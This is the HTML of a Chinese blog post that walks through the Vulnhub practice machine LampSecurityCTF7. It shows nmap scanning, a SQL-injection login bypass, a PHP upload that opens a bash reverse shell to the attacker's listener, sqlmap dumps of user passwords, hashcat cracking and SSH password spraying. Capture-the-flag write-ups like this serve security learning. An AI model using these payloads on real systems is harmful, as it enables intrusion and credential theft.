@@ -1,0 +1,300 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Vulnhub_LampSecurityCTF7 | d3mXBu7 の Blog</title><meta name="author" content="d3mXBu7"><meta name="copyright" content="d3mXBu7"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="LampSecurityCTF7-WP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulnhub_LampSecurityCTF7">
+<meta property="og:url" content="https://d3mxbu7.github.io/2024/05/24/%E9%9D%B6%E5%9C%BA/%E7%BA%A2%E9%98%9F%E7%AC%94%E8%AE%B0/LampSecurityCTF7/index.html">
+<meta property="og:site_name" content="d3mXBu7 の Blog">
+<meta property="og:description" content="LampSecurityCTF7-WP">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202401051739822.jpg">
+<meta property="article:published_time" content="2024-05-24T02:12:15.626Z">
+<meta property="article:modified_time" content="2024-05-24T02:17:01.462Z">
+<meta property="article:author" content="d3mXBu7">
+<meta property="article:tag" content="Vulnhub">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202401051739822.jpg"><link rel="shortcut icon" href="/favicon_ph/favicon.jpg"><link rel="canonical" href="https://d3mxbu7.github.io/2024/05/24/%E9%9D%B6%E5%9C%BA/%E7%BA%A2%E9%98%9F%E7%AC%94%E8%AE%B0/LampSecurityCTF7/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Vulnhub_LampSecurityCTF7',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-05-24 10:17:01'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="../public/css/font.css"><meta name="generator" content="Hexo 7.0.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202401051739822.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 链接</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: transparent"><nav id="nav"><span id="blog-info"><a href="/" title="d3mXBu7 の Blog"><span class="site-name">d3mXBu7 の Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 链接</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Vulnhub_LampSecurityCTF7</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-05-24T02:12:15.626Z" title="发表于 2024-05-24 10:12:15">2024-05-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-05-24T02:17:01.462Z" title="更新于 2024-05-24 10:17:01">2024-05-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%B6%E5%9C%BA-Vulnhub/">靶场-Vulnhub</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">890</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>3分钟</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 align ="center">LampSecurityCTF7</h1>
+
+
+
+
+<h1 id="主机发现与端口扫描"><a href="#主机发现与端口扫描" class="headerlink" title="主机发现与端口扫描"></a>主机发现与端口扫描</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.144.0/24</span><br><span class="line">nmap --min-rate -p- 192.168.144.135</span><br><span class="line">nudo nmap -sT -sV -O -p22,80,137,138,139,901,5900,8080,10000 192.168.144.135</span><br><span class="line">nmap -sU -p- 192.168.144.135</span><br><span class="line">nmap --script=vuln -p22,80,137,138,139,901,5900,8080,10000 192.168.144.135</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404281732861.png"></p>
+<h1 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h1><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><ul>
+<li>在端口80和8080寻找突破口，常用的思路是目录遍历,文件读取,登录框弱口令,sql注入,寻找框架漏洞。在8080端口的登录中发现存在sql注入的漏洞</li>
+</ul>
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404281739280.png" alt="image-20240428173946247"></p>
+<p>使用弱密码<code>‘ or 1=1 #</code>发现不需要密码也可登录(我个人感觉现实的这种情况太少了)</p>
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405031731749.png" alt="image-20240503173107608"></p>
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><ul>
+<li>接着就是常规思路，在后台中找到文件上传的点，尝试上传一句话木马文件。在Add a new Readings这个界面存在文件上传的点。传入一句话木马</li>
+</ul>
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405031739333.png" alt="image-20240503173920260"></p>
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405031740839.png" alt="image-20240503174031793"></p>
+<p>虽然说上传成功，但是没有返回文件的路径<strong>现在的思路就变成寻找文件目录地址，我们可以尝试报错得到文件的目录路径</strong>直接什么内容都不添加去报错得到文件路径</p>
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405031742171.png" alt="image-20240503174256135"></p>
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405031743027.png" alt="image-20240503174344980"></p>
+<p>后面就是简单的开启监听并且运行木马文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> exec(&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.144.132/233 0&gt;&amp;1&#x27;&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405032032527.png" alt="image-20240503203250467"></p>
+<h1 id="主机提权"><a href="#主机提权" class="headerlink" title="主机提权"></a>主机提权</h1><ul>
+<li>首先一波信息提权收集，得到的权限特别低.但是我们看到passwd这个内容,发现有很多用户,都是跟网站上面的那些用户名一样,所以我们看看能不能得到类似用户的账号密码,<strong>接下来就是查看密码</strong></li>
+</ul>
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405032109991.png" alt="image-20240503210934909"></p>
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405032111885.png" alt="image-20240503211100813"></p>
+<ul>
+<li>先用上一部靶机的思路看看有没有备份文件,发现命令是不能执行的</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -R -i pass /home/* 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<h2 id="寻找敏感信息"><a href="#寻找敏感信息" class="headerlink" title="寻找敏感信息"></a>寻找敏感信息</h2><ul>
+<li>查找发现在路径<code>/var/www/admin/inc</code>下存在sql数据库的配置文件,用户名是root密码为空</li>
+</ul>
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405032132975.png" alt="image-20240503213243910"></p>
+<ul>
+<li>连接数据库</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot</span><br></pre></td></tr></table></figure>
+
+<p>gg不知道为什么这个数据库连接不上</p>
+<p>没办法了</p>
+<h1 id="方法二：利用sql注入sqlmap一把梭哈"><a href="#方法二：利用sql注入sqlmap一把梭哈" class="headerlink" title="方法二：利用sql注入sqlmap一把梭哈"></a>方法二：利用sql注入sqlmap一把梭哈</h1><h2 id="注入点的寻找"><a href="#注入点的寻找" class="headerlink" title="注入点的寻找"></a>注入点的寻找</h2><ul>
+<li>在注册界面存在sql报错</li>
+</ul>
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405051756260.png" alt="image-20240505175607198"></p>
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405051755779.png" alt="image-20240505175545693"></p>
+<ul>
+<li>利用bp抓包并且保存数据包 使用sqlmap梭哈</li>
+</ul>
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405051758596.png" alt="image-20240505175800537"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r 2.txt --dbs --batch</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405051806403.png" alt="image-20240505180635355"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r packet.txt -D website --tables</span><br><span class="line">sqlmap -r packet.txt -D website -T users --columns</span><br><span class="line">sqlmap -r packet.txt -D website -T users -C username,password --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405051808235.png" alt="image-20240505180801186"></p>
+<h2 id="数据处理-密码喷洒登录ssh"><a href="#数据处理-密码喷洒登录ssh" class="headerlink" title="数据处理 密码喷洒登录ssh"></a>数据处理 密码喷洒登录ssh</h2><ul>
+<li>把sqlmap保存下来的数据处理</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /home/but/.local/share/sqlmap/output/192.168.144.128/dump/website/users.csv | awk -F &#x27;,&#x27; &#123;&#x27;print $2&#x27;&#125; | awk -F &#x27; &#x27; &#123;&#x27;print $1&#x27;&#125; &gt; /home/but/Desktop/passen.lst  (取得密文的部分)</span><br><span class="line">hashcat -a 0 -m 0 passen.lst /usr/share/wordlists/rockyou.txt   (md5破解)</span><br><span class="line">cat passworded.txt  | awk -F &#x27;:&#x27; &#123;&#x27;print $2&#x27;&#125; &gt; username.lst  (获得解密之后的明文)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>知道账号和密码之后，其实我们可以直接尝试ssh登录，但有这么多账号，如果用户名和密码不对应的话手动尝试很费劲（其实这里是对应的，完全可以直接登录，这里只是为了介绍学到的知识点），我们可以试试使用密码喷射的脚本crackmapexec</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec ssh 192.168.144.128 -u usrname1.lst -p pawd.lst --continue-on-success | grep &#x27;+&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405061638206.png" alt="image-20240506163852145"></p>
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405061641497.png" alt="image-20240506164145444"></p>
+<h1 id="简单提权"><a href="#简单提权" class="headerlink" title="简单提权"></a>简单提权</h1><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405061643290.png" alt="image-20240506164304230"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>当一条路走不通,就是反弹shell之后得到的交互不完整可以连接不了数据库,所以我们需要另外一条路就直接用sqlmap拿数据,还有这道题新的知识点是ssh密码喷洒</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://d3mxbu7.github.io">d3mXBu7</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://d3mxbu7.github.io/2024/05/24/%E9%9D%B6%E5%9C%BA/%E7%BA%A2%E9%98%9F%E7%AC%94%E8%AE%B0/LampSecurityCTF7/">https://d3mxbu7.github.io/2024/05/24/%E9%9D%B6%E5%9C%BA/%E7%BA%A2%E9%98%9F%E7%AC%94%E8%AE%B0/LampSecurityCTF7/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://d3mxbu7.github.io" target="_blank">d3mXBu7 の Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Vulnhub/">Vulnhub</a></div><div class="post_share"><div class="social-share" data-image="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202401051739822.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/05/24/%E9%9D%B6%E5%9C%BA/%E7%BA%A2%E9%98%9F%E7%AC%94%E8%AE%B0/LampSecurityCTF4/" title="Vulnhub_LampSecurityCTF4"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Vulnhub_LampSecurityCTF4</div></div></a></div><div class="next-post pull-right"><a href="/2024/05/24/%E9%9D%B6%E5%9C%BA/%E7%BA%A2%E9%98%9F%E7%AC%94%E8%AE%B0/pWnOS2.0/" title="Vulnhub_pWnOS2.0"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Vulnhub_pWnOS2.0</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">LampSecurityCTF7</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E4%B8%8E%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">2.</span> <span class="toc-text">主机发现与端口扫描</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">web渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-number">3.1.</span> <span class="toc-text">sql注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">3.2.</span> <span class="toc-text">文件上传</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">主机提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">4.1.</span> <span class="toc-text">寻找敏感信息</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E5%88%A9%E7%94%A8sql%E6%B3%A8%E5%85%A5sqlmap%E4%B8%80%E6%8A%8A%E6%A2%AD%E5%93%88"><span class="toc-number">5.</span> <span class="toc-text">方法二：利用sql注入sqlmap一把梭哈</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E7%9A%84%E5%AF%BB%E6%89%BE"><span class="toc-number">5.1.</span> <span class="toc-text">注入点的寻找</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86-%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92%E7%99%BB%E5%BD%95ssh"><span class="toc-number">5.2.</span> <span class="toc-text">数据处理 密码喷洒登录ssh</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E6%8F%90%E6%9D%83"><span class="toc-number">6.</span> <span class="toc-text">简单提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">7.</span> <span class="toc-text">总结</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By d3mXBu7</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@5.2.0/instantpage.min.js" type="module"></script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener
+  btf.removeGlobalFnEvent('pjax')
+  btf.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.12.0"></script></div></div></body></html>
